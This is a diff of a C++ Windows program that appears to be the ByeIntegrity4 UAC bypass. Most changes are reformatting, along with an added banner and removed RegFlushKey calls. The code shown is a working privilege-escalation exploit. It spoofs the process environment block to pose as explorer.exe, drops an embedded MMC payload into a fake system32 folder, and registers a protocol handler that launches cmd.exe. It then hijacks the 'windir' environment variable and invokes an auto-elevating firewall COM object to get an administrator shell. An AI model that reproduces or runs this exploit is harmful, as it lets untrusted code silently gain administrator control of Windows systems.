@@ -3,7 +3,7 @@
 #include <iostream>
 #include <string>
 
-#include "resource.h"
+#include "resource.hpp"
 
 EXTERN_C IMAGE_DOS_HEADER __ImageBase;
 
@@ -14,13 +14,13 @@ typedef struct _UNICODE_STRING
 	unsigned short MaximumLength;
 	long Padding_8;
 	wchar_t* Buffer;
-} UNICODE_STRING, * PUNICODE_STRING;
+} UNICODE_STRING, *PUNICODE_STRING;
 
 typedef struct _CURDIR
 {
 	struct _UNICODE_STRING DosPath;
 	void* Handle;
-} CURDIR, * PCURDIR;
+} CURDIR, *PCURDIR;
 
 typedef struct _STRING
 {
@@ -28,7 +28,7 @@ typedef struct _STRING
 	unsigned short MaximumLength;
 	long Padding_94;
 	char* Buffer;
-} STRING, * PSTRING;
+} STRING, *PSTRING;
 
 typedef struct _RTL_DRIVE_LETTER_CURDIR
 {
@@ -36,7 +36,7 @@ typedef struct _RTL_DRIVE_LETTER_CURDIR
 	unsigned short Length;
 	unsigned long TimeStamp;
 	struct _STRING DosPath;
-} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;
+} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;
 
 typedef struct _RTL_USER_PROCESS_PARAMETERS
 {
@@ -80,7 +80,7 @@ typedef struct _RTL_USER_PROCESS_PARAMETERS
 	unsigned __int64* DefaultThreadpoolCpuSetMasks;
 	unsigned long DefaultThreadpoolCpuSetMaskCount;
 	long __PADDING__[1];
-} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;
+} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
 
 constexpr auto PEB_OFFSET = 0x60ULL;
 constexpr auto PROCESS_PARAM_OFFSET = 0x20ULL;
@@ -131,7 +131,7 @@ struct IFwCplLua : IUnknown
 	ASSUME_HRESULT LaunchAdvancedUI() = 0;
 };
 
-const GUID IID_IFwCplLua = { 0x56DA8B35, 0x7FC3, 0x45DF, {0x87, 0x68, 0x66, 0x41, 0x47, 0x86, 0x45, 0x73} };
+const GUID IID_IFwCplLua = {0x56DA8B35, 0x7FC3, 0x45DF, {0x87, 0x68, 0x66, 0x41, 0x47, 0x86, 0x45, 0x73}};
 
 const BYTE SIGNATURE_NT10[] = {
 	0x48, 0x8B, 0xC4, 0x55, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x68, 0xA1, 0x48, 0x81, 0xEC, 0xA0,
@@ -144,7 +144,7 @@ const BYTE SIGNATURE_NT6X[] = {
 };
 
 void ForgeProcessInformation(PCWCHAR explorerPath, const RtlInitUnicodeStringPtr RtlInitUnicodeString,
-	const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules)
+                             const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules)
 {
 	auto* const pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
 	auto* pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);
@@ -152,24 +152,24 @@ void ForgeProcessInformation(PCWCHAR explorerPath, const RtlInitUnicodeStringPtr
 	RtlInitUnicodeString(&pProcessParams->ImagePathName, explorerPath);
 	RtlInitUnicodeString(&pProcessParams->CommandLine, L"explorer.exe");
 
-	LDR_CALLBACK_PARAMS params{ explorerPath, GetModuleHandleW(nullptr), RtlInitUnicodeString };
+	LDR_CALLBACK_PARAMS params{explorerPath, GetModuleHandleW(nullptr), RtlInitUnicodeString};
 
 	LdrEnumerateLoadedModules(0, [](PVOID ldrEntry, PVOID context, PBOOLEAN stop)
+	{
+		auto* params = static_cast<LDR_CALLBACK_PARAMS*>(context);
+
+		if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLL_BASE_OFFSET) == reinterpret_cast<
+			ULONG_PTR>(params->ImageBase))
 		{
-			auto* params = static_cast<LDR_CALLBACK_PARAMS*>(context);
+			const auto baseName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + BASENAME_OFFSET),
+			           fullName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + FULLNAME_OFFSET);
 
-			if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLL_BASE_OFFSET) == reinterpret_cast<
-				ULONG_PTR>(params->ImageBase))
-			{
-				const auto baseName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + BASENAME_OFFSET),
-					fullName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + FULLNAME_OFFSET);
+			params->RtlInitUnicodeString(baseName, L"explorer.exe");
+			params->RtlInitUnicodeString(fullName, params->ExplorerPath);
 
-				params->RtlInitUnicodeString(baseName, L"explorer.exe");
-				params->RtlInitUnicodeString(fullName, params->ExplorerPath);
-
-				*stop = TRUE;
-			}
-		}, reinterpret_cast<PVOID>(&params));
+			*stop = TRUE;
+		}
+	}, reinterpret_cast<PVOID>(&params));
 }
 
 template <typename T>
@@ -183,8 +183,8 @@ T LocateSignature(const BYTE signature[], const int signatureSize, const char* s
 		sectionHeader++;
 
 	for (auto* i = reinterpret_cast<PUCHAR>(moduleHandle) + sectionHeader->PointerToRawData; i != reinterpret_cast<
-		PUCHAR>(moduleHandle) + sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData - signatureSize; i++
-		)
+		     PUCHAR>(moduleHandle) + sectionHeader->PointerToRawData + sectionHeader->SizeOfRawData - signatureSize; i++
+	)
 	{
 		if (std::memcmp(signature, i, signatureSize) == 0)
 			return reinterpret_cast<T>(i);
@@ -197,6 +197,16 @@ int main()
 {
 	auto* hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
 
+	SetConsoleTextAttribute(hConsole, 8);
+	std::wcout <<
+		L" __________              .___        __                      .__  __            _____  \n"
+		L" \\______   \\___.__. ____ |   | _____/  |_  ____   ___________|__|/  |_ ___.__. /  |  | \n"
+		L"  |    |  _<   |  |/ __ \\|   |/    \\   __\\/ __ \\ / ___\\_  __ \\  \\   __<   |  |/   |  |_\n"
+		L"  |    |   \\\\___  \\  ___/|   |   |  \\  | \\  ___// /_/  >  | \\/  ||  |  \\___  /    ^   /\n"
+		L"  |______  // ____|\\___  >___|___|  /__|  \\___  >___  /|__|  |__||__|  / ____\\____   | \n"
+		L"         \\/ \\/         \\/         \\/          \\/_____/                 \\/         |__| \n\n";
+	SetConsoleTextAttribute(hConsole, 7);
+
 	auto* const pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
 	const auto osMajorVersion = *reinterpret_cast<PULONG>(pPeb + OS_MAJOR_VERSION_OFFSET);
 	const auto osMinorVersion = *reinterpret_cast<PULONG>(pPeb + OS_MINOR_VERSION_OFFSET);
@@ -206,8 +216,9 @@ int main()
 		std::wcout << L"OS not supported.\n";
 		return EXIT_FAILURE;
 	}
-	
-	auto* hResInfo = FindResourceW(reinterpret_cast<HMODULE>(&__ImageBase), MAKEINTRESOURCEW(IDR_MMCPAYLOAD), L"PAYLOAD");
+
+	auto* hResInfo = FindResourceW(reinterpret_cast<HMODULE>(&__ImageBase), MAKEINTRESOURCEW(IDR_MMCPAYLOAD),
+	                               L"PAYLOAD");
 	if (!hResInfo)
 	{
 		std::wcout << L"FindResourceW() failed. Error: " << GetLastError() << std::endl;
@@ -231,7 +242,8 @@ int main()
 		std::wcout << L"CreateDirectoryW() failed. Error: " << GetLastError() << std::endl;
 		return EXIT_FAILURE;
 	}
-	auto* hFile = CreateFileW(L"system32\\WF.msc", FILE_WRITE_ACCESS, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+	auto* hFile = CreateFileW(L"system32\\WF.msc", FILE_WRITE_ACCESS, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
+	                          nullptr);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		RemoveDirectoryW(L"system32");
@@ -249,7 +261,7 @@ int main()
 		std::wcout << L"WriteFile() failed. Error: " << GetLastError() << std::endl;
 		return EXIT_FAILURE;
 	}
-	
+
 	PWSTR windowsPath, systemPath;
 	auto hr = SHGetKnownFolderPath(FOLDERID_Windows, 0, nullptr, &windowsPath);
 	if (FAILED(hr))
@@ -269,7 +281,7 @@ int main()
 		return EXIT_FAILURE;
 	}
 
-	std::wstring explorer{ windowsPath }, system32{ systemPath };
+	std::wstring explorer{windowsPath}, system32{systemPath};
 	CoTaskMemFree(windowsPath);
 	CoTaskMemFree(systemPath);
 	explorer += L"\\explorer.exe";
@@ -292,7 +304,7 @@ int main()
 
 	HKEY key, protoKey;
 	auto status = RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\byeintegrity4\\shell\\open\\command", 0,
-		nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &key, nullptr);
+	                              nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &key, nullptr);
 	if (status)
 	{
 		DeleteFileW(L"system32\\WF.msc");
@@ -315,7 +327,7 @@ int main()
 	}
 	system32 += L"\\cmd.exe";
 	status = RegSetValueExW(key, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE*>(system32.c_str()),
-		static_cast<DWORD>(system32.size() * sizeof WCHAR + sizeof(L'\0')));
+	                        static_cast<DWORD>(system32.size() * sizeof WCHAR + sizeof(L'\0')));
 	RegCloseKey(key);
 	if (status)
 	{
@@ -340,7 +352,7 @@ int main()
 		std::wcout << L"RegSetValueExW() (1) failed. LSTATUS: " << status << std::endl;
 		return EXIT_FAILURE;
 	}
-	
+
 	if (osMajorVersion == 10 && osMinorVersion == 0)
 	{
 		auto* const hModule = LoadLibraryExW(L"SystemSettings.Handlers.dll", nullptr,
@@ -400,7 +412,7 @@ int main()
 		}
 
 		const auto UserAssocSet = LocateSignature<UserAssocSetPtr>(SIGNATURE_NT6X, sizeof SIGNATURE_NT6X, ".text",
-			hModule);
+		                                                           hModule);
 		if (!UserAssocSet)
 		{
 			DeleteFileW(L"system32\\WF.msc");
@@ -450,8 +462,9 @@ int main()
 			return EXIT_FAILURE;
 		}
 	}
-	
-	status = RegCreateKeyExW(HKEY_CURRENT_USER, L"Environment", 0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | KEY_QUERY_VALUE,
+
+	status = RegCreateKeyExW(HKEY_CURRENT_USER, L"Environment", 0, nullptr, REG_OPTION_NON_VOLATILE,
+	                         KEY_SET_VALUE | KEY_QUERY_VALUE,
 	                         nullptr, &key, nullptr);
 	if (status)
 	{
@@ -467,11 +480,11 @@ int main()
 		std::wcout << L"RegCreateKeyExW() (3) failed. LSTATUS: " << status << std::endl;
 		return EXIT_FAILURE;
 	}
-	
+
 	const auto requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr));
 	auto currentDirectory = new WCHAR[requiredSize + 1];
 	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);
-	
+
 	status = RegSetValueExW(key, L"windir", 0, REG_SZ, reinterpret_cast<const BYTE*>(currentDirectory),
 	                        requiredSize * sizeof(WCHAR) + sizeof(L'\0'));
 	delete[] currentDirectory;
@@ -490,7 +503,6 @@ int main()
 		std::wcout << L"RegSetValueExW() (3) failed. LSTATUS: " << status << std::endl;
 		return EXIT_FAILURE;
 	}
-	RegFlushKey(key);
 	SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, reinterpret_cast<LPARAM>(L"Environment"), SMTO_BLOCK,
 	                    1000, nullptr);
 
@@ -500,14 +512,13 @@ int main()
 
 	IFwCplLua* fwCplLua;
 	hr = CoGetObject(L"Elevation:Administrator!new:{752438CB-E941-433F-BCB4-8B7D2329F0C8}", &bind, IID_IFwCplLua,
-		reinterpret_cast<void**>(&fwCplLua));
+	                 reinterpret_cast<void**>(&fwCplLua));
 	if (FAILED(hr))
 	{
 		RegDeleteValueW(key, L"windir");
-		RegFlushKey(key);
 		RegCloseKey(key);
 		SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, reinterpret_cast<LPARAM>(L"Environment"), SMTO_BLOCK,
-			1000, nullptr);
+		                    1000, nullptr);
 		DeleteFileW(L"system32\\WF.msc");
 		RemoveDirectoryW(L"system32");
 		if (osMajorVersion == 6 && osMinorVersion == 1)
@@ -520,14 +531,13 @@ int main()
 		std::wcout << L"CoGetObject() failed. HRESULT: 0x" << std::hex << hr << std::endl;
 		return EXIT_FAILURE;
 	}
-	
+
 	hr = fwCplLua->LaunchAdvancedUI();
 	Sleep(1500);
 	RegDeleteValueW(key, L"windir");
-	RegFlushKey(key);
 	RegCloseKey(key);
 	SendMessageTimeoutW(HWND_BROADCAST, WM_SETTINGCHANGE, 0, reinterpret_cast<LPARAM>(L"Environment"), SMTO_BLOCK,
-		1000, nullptr);
+	                    1000, nullptr);
 	fwCplLua->Release();
 	DeleteFileW(L"system32\\WF.msc");
 	RemoveDirectoryW(L"system32");
